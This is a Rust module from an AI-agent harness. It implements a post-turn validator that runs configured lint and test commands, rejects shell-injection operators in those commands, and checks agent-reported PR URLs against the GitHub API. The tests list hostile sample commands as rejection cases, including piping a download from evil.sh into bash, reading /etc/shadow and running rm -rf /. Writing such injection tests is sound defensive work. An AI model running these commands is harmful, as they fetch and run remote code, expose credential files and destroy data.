use async_trait::async_trait;
use harness_core::agent::{AgentRequest, AgentResponse};
use harness_core::config::misc::ValidationConfig;
use harness_core::interceptor::{InterceptResult, PostExecuteResult, TurnInterceptor};
use harness_core::prompts;
use std::path::Path;
use tokio::process::Command;
use tokio::time::{timeout, Duration};

/// Runs project-specific validation commands after each agent turn.
///
/// If `config.pre_commit` is empty, language detection kicks in and selects
/// appropriate default commands (cargo fmt/check/clippy for Rust, etc.).
///
/// On failure the executor will inject the error output into the next
/// turn prompt and retry up to `config.max_retries` times.
pub struct PostExecutionValidator {
    config: ValidationConfig,
    /// Deprecated test-only field retained for struct literal compatibility.
    gh_bin: String,
}

/// Classify a command string into a human-readable error prefix.
///
/// Matches on substrings in priority order (first match wins). Commands
/// always carry args (e.g. `cargo test -- --nocapture`), so substring
/// matching on the full command string handles path-prefixed binaries
/// (e.g. `/home/ci/bin/cargo check`) without extra processing.
fn classify_command(cmd: &str) -> &'static str {
    // Compile: check/build commands
    if cmd.contains("cargo check")
        || cmd.contains("cargo build")
        || cmd.contains("go build")
        || cmd.contains("tsc")
    {
        return "[COMPILE ERROR]";
    }
    // Test: test runner commands
    if cmd.contains("cargo test")
        || cmd.contains("go test")
        || cmd.contains("pytest")
        || cmd.contains("bun test")
        || cmd.contains("jest")
    {
        return "[TEST FAILURE]";
    }
    // Lint: formatting and linting commands
    if cmd.contains("cargo clippy")
        || cmd.contains("cargo fmt")
        || cmd.contains("ruff")
        || cmd.contains("eslint")
        || cmd.contains("golangci-lint")
    {
        return "[LINT ERROR]";
    }
    "[VALIDATION ERROR]"
}

fn parse_github_pr_url(pr_url: &str) -> Option<(String, u64)> {
    let path = pr_url
        .strip_prefix("https://github.com/")
        .or_else(|| pr_url.strip_prefix("http://github.com/"))?;
    let mut parts = path.split('/');
    let owner = parts.next()?;
    let repo = parts.next()?;
    if parts.next()? != "pull" {
        return None;
    }
    let pr_number = parts.next()?.parse().ok()?;
    Some((format!("{owner}/{repo}"), pr_number))
}

/// Validate that a command string does not contain unquoted shell operators
/// that could enable command chaining or execution escalation.
///
/// The check is quote-aware: operators inside single quotes (`'...'`) are
/// ignored because the shell treats them as literal text. Inside double
/// quotes (`"..."`), only command substitution (`` ` `` and `$(`) is
/// blocked since `|`, `&`, `;`, `>`, `<` are inactive there.
///
/// Used by both [`PostExecutionValidator`] (validation commands) and
/// [`crate::workspace`] (workspace hooks) to reject config-supplied strings
/// with shell injection potential before passing them to `sh -c`.
///
/// Delegates to [`harness_core::shell_safety::validate_shell_safety`] with
/// strict mode (`allow_redirections = false`) — redirections are not needed
/// for validator/hook commands and are rejected as a precaution.
pub(crate) fn validate_command_safety(cmd_str: &str) -> Result<(), String> {
    harness_core::shell_safety::validate_shell_safety(cmd_str, false)
}

impl PostExecutionValidator {
    pub fn new(config: ValidationConfig) -> Self {
        Self {
            config,
            gh_bin: "gh".to_string(),
        }
    }

    /// Verify that a PR URL exists through the GitHub REST API.
    async fn verify_pr_exists(
        _gh_bin: &str,
        pr_url: &str,
        _project: &Path,
        timeout_secs: u64,
    ) -> Result<(), String> {
        let (repo, pr_number) = parse_github_pr_url(pr_url)
            .ok_or_else(|| format!("Could not parse GitHub PR URL: {pr_url}"))?;
        let client = reqwest::Client::new();
        let mut request = client
            .get(format!(
                "https://api.github.com/repos/{repo}/pulls/{pr_number}"
            ))
            .header(reqwest::header::ACCEPT, "application/vnd.github+json")
            .header(reqwest::header::USER_AGENT, "harness-server");
        if let Ok(token) = std::env::var("GITHUB_TOKEN").or_else(|_| std::env::var("GH_TOKEN")) {
            if !token.trim().is_empty() {
                request = request.bearer_auth(token);
            }
        }

        let result = timeout(Duration::from_secs(timeout_secs), request.send()).await;
        match result {
            Ok(Ok(response)) if response.status().is_success() => Ok(()),
            Ok(Ok(response)) => Err(format!(
                "GitHub PR lookup for {pr_url} failed with status {}",
                response.status()
            )),
            Ok(Err(e)) => Err(format!("GitHub PR lookup for {pr_url} failed: {e}")),
            Err(_) => Err(format!(
                "GitHub PR lookup for {pr_url} timed out after {timeout_secs}s"
            )),
        }
    }

    /// Returns true if the error indicates a transient network failure worth retrying.
    fn is_transient_error(error: &str) -> bool {
        const TRANSIENT_PATTERNS: &[&str] = &[
            "EOF",
            "connection reset",
            "connection refused",
            "broken pipe",
        ];
        TRANSIENT_PATTERNS.iter().any(|p| error.contains(p))
    }

    /// Retry [`verify_pr_exists`] up to 3 times for transient network errors.
    /// Permanent errors (repo not found, auth failure, timeout) are returned immediately.
    async fn verify_pr_exists_with_retry(
        gh_bin: &str,
        pr_url: &str,
        project: &Path,
        timeout_secs: u64,
    ) -> Result<(), String> {
        let max_attempts = 3;
        let mut last_err = String::new();
        for attempt in 1..=max_attempts {
            match Self::verify_pr_exists(gh_bin, pr_url, project, timeout_secs).await {
                Ok(()) => return Ok(()),
                Err(e) if !Self::is_transient_error(&e) => return Err(e),
                Err(e) => {
                    last_err = e;
                    if attempt < max_attempts {
                        tracing::debug!(
                            attempt,
                            pr_url,
                            "post_validator: transient failure, retrying"
                        );
                        tokio::time::sleep(Duration::from_secs(2)).await;
                    }
                }
            }
        }
        Err(last_err)
    }

    /// Run a shell command via `sh -c` to support pipes, quotes, and complex expressions.
    ///
    /// Uses `kill_on_drop(true)` so that if the timeout fires and the future is dropped,
    /// the child process is killed rather than left running as an orphan.
    async fn run_command(cmd_str: &str, project: &Path, timeout_secs: u64) -> Result<(), String> {
        if cmd_str.trim().is_empty() {
            return Ok(());
        }

        let child = match Command::new("sh")
            .args(["-c", cmd_str])
            .current_dir(project)
            .stdin(std::process::Stdio::null())
            .kill_on_drop(true)
            .spawn()
        {
            Ok(c) => c,
            Err(e) => return Err(format!("Command `{cmd_str}` failed to spawn: {e}")),
        };

        let result = timeout(Duration::from_secs(timeout_secs), child.wait_with_output()).await;

        match result {
            Ok(Ok(output)) if output.status.success() => Ok(()),
            Ok(Ok(output)) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                let stdout = String::from_utf8_lossy(&output.stdout);
                let code = output.status.code().unwrap_or(-1);
                Err(format!(
                    "Command `{cmd_str}` failed (exit {code})\nstdout: {stdout}\nstderr: {stderr}"
                ))
            }
            Ok(Err(e)) => Err(format!("Command `{cmd_str}` failed to wait: {e}")),
            Err(_) => Err(format!(
                "Command `{cmd_str}` timed out after {timeout_secs}s"
            )),
        }
    }
}

#[async_trait]
impl TurnInterceptor for PostExecutionValidator {
    fn name(&self) -> &str {
        "post_execution_validator"
    }

    async fn pre_execute(&self, _req: &AgentRequest) -> InterceptResult {
        InterceptResult::pass()
    }

    fn max_validation_retries(&self) -> Option<u32> {
        Some(self.config.max_retries)
    }

    async fn post_execute(&self, req: &AgentRequest, resp: &AgentResponse) -> PostExecuteResult {
        let project = &req.project_root;

        // Only run explicitly configured commands from .harness/config.toml.
        // When config is empty, validation instructions are injected into the
        // agent prompt instead (see task_executor.rs). This avoids hardcoded
        // tool assumptions and lets the agent adapt to the project environment.
        let pre_commit = if self.config.pre_commit.is_empty() {
            vec![]
        } else {
            for cmd in &self.config.pre_commit {
                if let Err(e) = validate_command_safety(cmd) {
                    return PostExecuteResult::fail(e);
                }
            }
            self.config.pre_commit.clone()
        };

        let pre_push = if self.config.pre_push.is_empty() {
            vec![]
        } else {
            for cmd in &self.config.pre_push {
                if let Err(e) = validate_command_safety(cmd) {
                    return PostExecuteResult::fail(e);
                }
            }
            self.config.pre_push.clone()
        };

        let mut errors: Vec<String> = Vec::new();

        // Run pre_commit commands (format, compile, lint).
        for cmd in &pre_commit {
            tracing::info!(cmd = %cmd, "post_validator: pre_commit");
            match Self::run_command(cmd, project, self.config.timeout_secs).await {
                Ok(()) => tracing::debug!(cmd = %cmd, "post_validator: passed"),
                Err(e) => {
                    tracing::warn!(cmd = %cmd, error = %e, "post_validator: failed");
                    errors.push(format!("{}\n{}", classify_command(cmd), e));
                }
            }
        }

        // Run pre_push commands (tests) only if pre_commit passed.
        if errors.is_empty() {
            for cmd in &pre_push {
                tracing::info!(cmd = %cmd, "post_validator: pre_push");
                match Self::run_command(cmd, project, self.config.timeout_secs).await {
                    Ok(()) => tracing::debug!(cmd = %cmd, "post_validator: passed"),
                    Err(e) => {
                        tracing::warn!(cmd = %cmd, error = %e, "post_validator: failed");
                        errors.push(format!("{}\n{}", classify_command(cmd), e));
                    }
                }
            }
        }

        // PR existence verification: if the agent output contains a PR_URL,
        // verify via `gh pr view` that the PR actually exists on GitHub.
        // This prevents silently succeeding when an agent claims to have created
        // a PR that does not exist. Runs only when all other validations pass
        // to avoid noisy failures from incomplete code.
        if errors.is_empty() {
            if let Some(pr_url) = prompts::parse_pr_url(&resp.output) {
                // Guard: only verify URLs that look like a real GitHub PR
                // (contain /pull/{number}).  Non-PR URLs are silently skipped.
                if prompts::extract_pr_number(&pr_url).is_some() {
                    // Use the full URL so `gh` resolves the exact repo the
                    // agent targeted, not the repo of the current checkout.
                    // This prevents false passes (same PR number in local repo)
                    // and false failures (PR opened against a fork or different
                    // repo).
                    tracing::info!(
                        pr_url = %pr_url,
                        "post_validator: verifying PR existence via GitHub API"
                    );
                    match Self::verify_pr_exists_with_retry(
                        &self.gh_bin,
                        &pr_url,
                        project,
                        self.config.timeout_secs,
                    )
                    .await
                    {
                        Ok(()) => tracing::debug!(pr_url = %pr_url, "post_validator: PR verified"),
                        Err(e) => {
                            tracing::warn!(
                                pr_url = %pr_url,
                                error = %e,
                                "post_validator: PR verification failed"
                            );
                            errors.push(format!(
                                "[VALIDATION ERROR] PR {pr_url} could not be verified via GitHub API: {e}"
                            ));
                        }
                    }
                }
            }
        }

        if errors.is_empty() {
            PostExecuteResult::pass()
        } else {
            PostExecuteResult::fail(errors.join("\n\n"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use harness_core::{
        agent::AgentRequest, agent::AgentResponse, config::misc::ValidationConfig,
        types::TokenUsage,
    };
    use std::path::PathBuf;

    fn make_req(project_root: PathBuf) -> AgentRequest {
        AgentRequest {
            prompt: "fix the bug. Ensure tests pass.".to_string(),
            project_root,
            ..Default::default()
        }
    }

    fn make_resp(output: &str) -> AgentResponse {
        AgentResponse {
            output: output.to_string(),
            stderr: String::new(),
            items: vec![],
            token_usage: TokenUsage::default(),
            model: "claude-sonnet".to_string(),
            exit_code: Some(0),
        }
    }

    #[tokio::test]
    async fn passes_when_no_commands_configured_and_unknown_project() {
        let dir = tempfile::tempdir().unwrap();
        let validator = PostExecutionValidator::new(ValidationConfig::default());
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // Unknown project → no commands → should pass
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn passes_when_command_succeeds() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["true".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn fails_when_command_exits_nonzero() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        assert!(result.error.is_some());
        assert!(result.error.unwrap().contains("false"));
    }

    #[tokio::test]
    async fn collects_all_failures_not_just_first() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string(), "false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // Both failures should be captured
        let err = result.error.unwrap();
        assert!(err.contains("false"));
    }

    #[test]
    fn interceptor_name_is_post_execution_validator() {
        let v = PostExecutionValidator::new(ValidationConfig::default());
        assert_eq!(v.name(), "post_execution_validator");
    }

    #[tokio::test]
    async fn pre_execute_always_passes() {
        let dir = tempfile::tempdir().unwrap();
        let v = PostExecutionValidator::new(ValidationConfig::default());
        let req = make_req(dir.path().to_path_buf());
        let result = v.pre_execute(&req).await;
        assert_eq!(result.decision, harness_core::types::Decision::Pass);
    }

    #[test]
    fn max_validation_retries_reads_from_config() {
        let config = ValidationConfig {
            max_retries: 5,
            ..Default::default()
        };
        let v = PostExecutionValidator::new(config);
        assert_eq!(v.max_validation_retries(), Some(5));
    }

    #[test]
    fn max_validation_retries_default_is_two() {
        let v = PostExecutionValidator::new(ValidationConfig::default());
        assert_eq!(v.max_validation_retries(), Some(2));
    }

    #[tokio::test]
    async fn pre_push_runs_when_pre_commit_passes() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["true".to_string()],
            pre_push: vec!["false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // pre_commit passes but pre_push fails
        assert!(result.error.is_some());
    }

    #[tokio::test]
    async fn timeout_kills_child_process() {
        let dir = tempfile::tempdir().unwrap();
        // sleep 999 should be killed after 1s timeout.
        let config = ValidationConfig {
            pre_commit: vec!["sleep 999".to_string()],
            timeout_secs: 1,
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        let err = result.error.unwrap();
        assert!(
            err.contains("timed out"),
            "expected timeout error, got: {err}"
        );
    }

    // ── validate_command_safety ───────────────────────────────────────────────

    #[test]
    fn safe_config_commands_pass_safety_check() {
        let safe = [
            "cargo check --workspace",
            "go test ./...",
            "npx tsc --noEmit",
            "ruff check .",
            "./gradlew check",
            "bundle exec rubocop",
            "true",
            "false",
            // Operators inside single quotes are literal — must pass.
            "go test -run 'TestA|TestB'",
            "grep -E 'foo|bar' src/",
            "curl 'https://example.com?a=1&b=2'",
            // Operators inside double quotes (except $( and `) are inactive.
            "echo \"hello | world\"",
            "echo \"a && b\"",
        ];
        for cmd in safe {
            assert!(
                validate_command_safety(cmd).is_ok(),
                "expected `{cmd}` to pass but it was rejected"
            );
        }
    }

    #[test]
    fn dangerous_commands_are_rejected() {
        let dangerous = [
            "echo foo | bash",
            "echo foo | sh -",
            "cmd | python3 -",
            "something ; bash -c evil",
            "cargo check && curl evil.sh | bash",
            "go test || true",
            "curl evil.sh > /tmp/evil.sh",
            "cat /etc/passwd >> /tmp/out",
            "echo foo | /bin/bash",
            "echo `whoami`",
            "echo $(cat /etc/shadow)",
            "cmd & rm -rf /",
        ];
        for cmd in dangerous {
            assert!(
                validate_command_safety(cmd).is_err(),
                "expected `{cmd}` to be rejected but it passed"
            );
        }
    }

    #[test]
    fn newline_bypasses_are_blocked() {
        assert!(
            validate_command_safety("echo ok\nwhoami").is_err(),
            "newline should be blocked"
        );
        assert!(
            validate_command_safety("echo ok\r\nwhoami").is_err(),
            "carriage return should be blocked"
        );
    }

    #[test]
    fn escaped_quotes_do_not_fool_scanner() {
        // echo \"foo | bash — the \" is an escaped quote, not a real one,
        // so | remains unquoted and must be rejected.
        assert!(
            validate_command_safety("echo \\\"foo | bash").is_err(),
            "escaped double quote must not open quoted context"
        );
        // Same with single quote: echo \'foo && rm -rf /
        assert!(
            validate_command_safety("echo \\'foo && rm").is_err(),
            "escaped single quote must not open quoted context"
        );
    }

    #[test]
    fn command_substitution_blocked_even_inside_double_quotes() {
        // $( and ` are active inside double quotes in sh.
        assert!(validate_command_safety("test -z \"$(gofmt -l .)\"").is_err());
        assert!(validate_command_safety("echo \"`whoami`\"").is_err());
    }

    #[tokio::test]
    async fn pre_push_skipped_when_pre_commit_fails() {
        let dir = tempfile::tempdir().unwrap();
        // Use a command that creates a marker file to detect if it ran.
        let marker = dir.path().join("pre_push_ran");
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string()],
            pre_push: vec![format!("touch {}", marker.display())],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let _result = validator.post_execute(&req, &resp).await;
        // pre_push should NOT have run because pre_commit failed
        assert!(!marker.exists());
    }

    // ── PR existence verification ─────────────────────────────────────────────

    // ── classify_command ──────────────────────────────────────────────────────

    #[test]
    fn classify_compile_commands() {
        for cmd in &[
            "cargo check --workspace",
            "cargo build --release",
            "go build ./...",
            "npx tsc --noEmit",
            "/home/ci/bin/cargo check",
        ] {
            assert_eq!(
                classify_command(cmd),
                "[COMPILE ERROR]",
                "expected [COMPILE ERROR] for `{cmd}`"
            );
        }
    }

    #[test]
    fn classify_test_commands() {
        for cmd in &[
            "cargo test",
            "cargo test -- --nocapture",
            "go test ./...",
            "pytest",
            "bun test",
            "jest --coverage",
        ] {
            assert_eq!(
                classify_command(cmd),
                "[TEST FAILURE]",
                "expected [TEST FAILURE] for `{cmd}`"
            );
        }
    }

    #[test]
    fn classify_lint_commands() {
        for cmd in &[
            "cargo clippy --workspace -- -D warnings",
            "cargo fmt --check",
            "ruff check .",
            "eslint src/",
            "golangci-lint run",
        ] {
            assert_eq!(
                classify_command(cmd),
                "[LINT ERROR]",
                "expected [LINT ERROR] for `{cmd}`"
            );
        }
    }

    #[test]
    fn classify_unknown_command() {
        for cmd in &["false", "./scripts/check.sh", "make verify", "true"] {
            assert_eq!(
                classify_command(cmd),
                "[VALIDATION ERROR]",
                "expected [VALIDATION ERROR] for `{cmd}`"
            );
        }
    }

    #[tokio::test]
    async fn error_prefix_appears_in_output() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["cargo check --workspace".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        // `cargo check` will fail (not a real Rust project), error must carry prefix
        let err = result.error.unwrap();
        assert!(
            err.contains("[COMPILE ERROR]"),
            "expected [COMPILE ERROR] prefix, got: {err}"
        );
    }

    #[tokio::test]
    async fn multi_error_different_kinds() {
        let dir = tempfile::tempdir().unwrap();
        // Both commands run in pre_commit so both can fail in the same pass.
        let config = ValidationConfig {
            pre_commit: vec![
                "cargo check --workspace".to_string(),
                "cargo clippy --workspace -- -D warnings".to_string(),
            ],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("done");
        let result = validator.post_execute(&req, &resp).await;
        let err = result.error.unwrap();
        assert!(
            err.contains("[COMPILE ERROR]"),
            "expected [COMPILE ERROR] in combined error, got: {err}"
        );
        assert!(
            err.contains("[LINT ERROR]"),
            "expected [LINT ERROR] in combined error, got: {err}"
        );
    }

    #[tokio::test]
    async fn pr_verification_skipped_when_output_has_no_pr_url() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig::default();
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        let resp = make_resp("implementation done, no PR created");
        let result = validator.post_execute(&req, &resp).await;
        // No PR_URL in output → verification not attempted → pass
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn pr_verification_skipped_when_pr_url_has_no_number() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig::default();
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        // URL does not contain a PR number
        let resp = make_resp("done\nPR_URL=https://github.com/owner/repo/");
        let result = validator.post_execute(&req, &resp).await;
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn pr_verification_skipped_when_pre_commit_fails() {
        let dir = tempfile::tempdir().unwrap();
        let config = ValidationConfig {
            pre_commit: vec!["false".to_string()],
            ..Default::default()
        };
        let validator = PostExecutionValidator::new(config);
        let req = make_req(dir.path().to_path_buf());
        // PR_URL is present but pre_commit failed — verification must not run
        let resp = make_resp("done\nPR_URL=https://github.com/owner/repo/pull/42");
        let result = validator.post_execute(&req, &resp).await;
        let err = result.error.unwrap();
        // The error should be from pre_commit, not from PR verification
        assert!(
            err.contains("false"),
            "expected pre_commit error, got: {err}"
        );
        assert!(
            !err.contains("github.com/owner/repo/pull/42"),
            "PR verification must not run when pre_commit fails"
        );
    }

    #[tokio::test]
    async fn pr_verification_fails_for_unparseable_pr_url() {
        let dir = tempfile::tempdir().unwrap();
        let err = PostExecutionValidator::verify_pr_exists(
            "",
            "https://example.com/not-a-pr",
            dir.path(),
            1,
        )
        .await
        .unwrap_err();
        assert!(
            err.contains("https://example.com/not-a-pr"),
            "expected error mentioning PR URL, got: {err}"
        );
    }
}
